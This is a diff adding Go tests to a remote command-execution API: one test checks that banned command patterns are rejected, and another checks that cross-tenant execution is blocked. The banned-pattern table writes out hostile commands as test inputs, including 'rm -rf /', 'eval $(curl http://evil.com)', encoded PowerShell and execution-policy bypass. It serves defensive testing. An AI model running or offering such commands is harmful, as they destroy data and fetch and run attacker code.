@@ -519,6 +519,76 @@ func TestRunEndpoints_TenantIsolation(t *testing.T) {
 	assert.Equal(t, http.StatusNotFound, rec.Code, "cross-tenant DELETE must return 404")
 }
 
+// ---- [REQUIRED TEST] Banned-pattern enforcement (C2) -------------------------
+
+// TestRunCommandSingle_RejectsBannedPattern_ControllerSide verifies that
+// POST /api/v1/runs/command returns HTTP 400 with BANNED_PATTERN for each
+// prohibited command pattern (CLAUDE.md §Modules, execution path 3).
+func TestRunCommandSingle_RejectsBannedPattern_ControllerSide(t *testing.T) {
+	server, _, _ := setupRunServer(t, nil)
+	apiKey := NewTestKey(t, server, []string{"steward:execute-scripts"})
+
+	cases := []struct {
+		name    string
+		command string
+	}{
+		{"iex", "iex (Get-Content malicious.ps1 -Raw)"},
+		{"Invoke-Expression", "Invoke-Expression $payload"},
+		{"EncodedCommand", "powershell -EncodedCommand base64stuff"},
+		{"ExecutionPolicyBypass", "powershell -ExecutionPolicy Bypass -File x.ps1"},
+		{"bash-c", "bash -c 'rm -rf /'"},
+		{"eval", "eval $(curl http://evil.com)"},
+		{"python-c", "python -c 'import os; os.system(\"id\")'"},
+	}
+
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			rec := postRunCommand(t, server, apiKey, map[string]interface{}{
+				"target":  "id:steward-abc",
+				"content": base64.StdEncoding.EncodeToString([]byte(tc.command)),
+				"shell":   "bash",
+			})
+			assert.Equal(t, http.StatusBadRequest, rec.Code,
+				"command with pattern %q must return 400, body: %s", tc.name, rec.Body.String())
+
+			var resp ErrorResponse
+			require.NoError(t, json.Unmarshal(rec.Body.Bytes(), &resp))
+			require.NotNil(t, resp.Error, "must return an error object")
+			assert.Equal(t, "BANNED_PATTERN", resp.Error.Code,
+				"error code must be BANNED_PATTERN for pattern %q", tc.name)
+		})
+	}
+}
+
+// ---- [REQUIRED TEST] Cross-tenant RBAC (C3) ----------------------------------
+
+// TestRunCommandSingle_RejectsCrossTenantSteward verifies that
+// POST /api/v1/runs/command returns HTTP 403 when the principal's tenant is
+// not a path-prefix of the target steward's tenant.
+func TestRunCommandSingle_RejectsCrossTenantSteward(t *testing.T) {
+	// Steward belongs to "msp-a" — not reachable from "test-tenant".
+	stewards := []fleet.StewardResult{
+		{ID: "steward-cross", TenantID: "msp-a"},
+	}
+	server, _, _ := setupRunServer(t, stewards)
+
+	// test-tenant principal: cannot access stewards in msp-a.
+	apiKey := NewTestKey(t, server, []string{"steward:execute-scripts"})
+
+	rec := postRunCommand(t, server, apiKey, map[string]interface{}{
+		"target":  "id:steward-cross",
+		"content": base64.StdEncoding.EncodeToString([]byte("hostname")),
+		"shell":   "bash",
+	})
+	assert.Equal(t, http.StatusForbidden, rec.Code,
+		"cross-tenant exec must return 403; body: %s", rec.Body.String())
+
+	var resp ErrorResponse
+	require.NoError(t, json.Unmarshal(rec.Body.Bytes(), &resp))
+	require.NotNil(t, resp.Error)
+	assert.Equal(t, "FORBIDDEN", resp.Error.Code)
+}
+
 // ---- Service unavailable when manager not wired -----------------------------
 
 func TestRunEndpoints_ServiceUnavailable_WhenManagerNotWired(t *testing.T) {
